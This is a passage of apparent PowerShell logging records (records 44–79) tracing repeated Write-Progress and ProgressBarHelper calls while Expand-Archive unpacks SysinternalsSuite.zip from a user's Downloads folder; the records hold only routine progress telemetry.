ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;94&quot;
                                                                                                                                                                                                                                                                 
-RECORD 44----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;287&quot;
 
-RECORD 45----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;93&quot;
                                                                                                                                                                                                                                                                 
-RECORD 46----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;286&quot;
 
-RECORD 47----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;93&quot;
                                                                                                                                                                                                                                                                 
-RECORD 48----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;285&quot;
 
-RECORD 49----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;93&quot;
                                                                                                                                                                                                                                                                 
-RECORD 50----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;284&quot;
 
-RECORD 51----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;92&quot;
                                                                                                                                                                                                                                                                 
-RECORD 52----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;283&quot;
 
-RECORD 53----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;92&quot;
                                                                                                                                                                                                                                                                 
-RECORD 54----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;282&quot;
 
-RECORD 55----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;92&quot;
                                                                                                                                                                                                                                                                 
-RECORD 56----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;281&quot;
 
-RECORD 57----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;91&quot;
                                                                                                                                                                                                                                                                 
-RECORD 58----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;280&quot;
 
-RECORD 59----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;91&quot;
                                                                                                                                                                                                                                                                 
-RECORD 60----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;279&quot;
 
-RECORD 61----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;91&quot;
                                                                                                                                                                                                                                                                 
-RECORD 62----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;278&quot;
 
-RECORD 63----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;90&quot;
                                                                                                                                                                                                                                                                 
-RECORD 64----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;277&quot;
 
-RECORD 65----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;90&quot;
                                                                                                                                                                                                                                                                 
-RECORD 66----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;276&quot;
 
-RECORD 67----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;90&quot;
                                                                                                                                                                                                                                                                 
-RECORD 68----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;275&quot;
 
-RECORD 69----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;89&quot;
                                                                                                                                                                                                                                                                 
-RECORD 70----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;274&quot;
 
-RECORD 71----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;89&quot;
                                                                                                                                                                                                                                                                 
-RECORD 72----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;273&quot;
 
-RECORD 73----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;89&quot;
                                                                                                                                                                                                                                                                 
-RECORD 74----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;272&quot;
 
-RECORD 75----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;88&quot;
                                                                                                                                                                                                                                                                 
-RECORD 76----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;271&quot;
 
-RECORD 77----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;88&quot;
                                                                                                                                                                                                                                                                 
-RECORD 78----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;270&quot;
 
-RECORD 79----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
